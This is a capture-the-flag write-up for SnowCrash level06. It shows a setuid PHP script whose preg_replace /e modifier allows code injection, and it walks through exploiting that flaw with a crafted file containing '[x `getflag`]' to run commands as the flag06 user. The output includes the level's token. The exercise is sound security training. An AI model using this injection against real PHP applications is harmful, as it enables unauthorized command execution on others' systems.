# Level06

We got two files this time...

```
level06@SnowCrash:~$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

Formatting the php file we get the following:

```
#!/usr/bin/php
<?php
function y($m)
{
  $m = preg_replace("/\./", " x ", $m);
  $m = preg_replace("/@/", " y", $m);
  return $m;
}
function x($y, $z)
{
  $a = file_get_contents($y);
  $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
  $a = preg_replace("/\[/", "(", $a);
  $a = preg_replace("/\]/", ")", $a);
  return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>
```

This seems like a regex exploitation. I did some PHP in the past, and I know that `/e` is deprecated because you could exploit it.
The script expects a file & we can put something in the file to use the exploitation.
Let's do the following:

```
echo "hello world" > /tmp/exploit
./level06 /tmp/exploit

level06@SnowCrash:~$ ./level06 /tmp/exploit
hello world
```

It seems to read from the file. What PHP expects is a `[x ]`. And whatever is inside can be exploited...

```
level06@SnowCrash:~$ echo "[x $(pwd)]" > /tmp/exploit
level06@SnowCrash:~$ ./level06 /tmp/exploit
/home/user/level06
```

Alright now lets use getflag...

```

level06@SnowCrash:~$ echo "[x $(getflag)]" > /tmp/exploit
level06@SnowCrash:~$ ./level06 /tmp/exploit
(x Check flag.Here is your token :
Nope there is no token here for you sorry. Try again :))
```

Problem is, is that we still execute the command as our own user, not as flag06.
That's how bash evaluates it. Just like with the perl puzzle, we need to use quotes to pass the string along without bash interacting with it.

```
level06@SnowCrash:~$ echo '[x `getflag`]' > /tmp/exploit
level06@SnowCrash:~$ ./level06 /tmp/exploit
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```
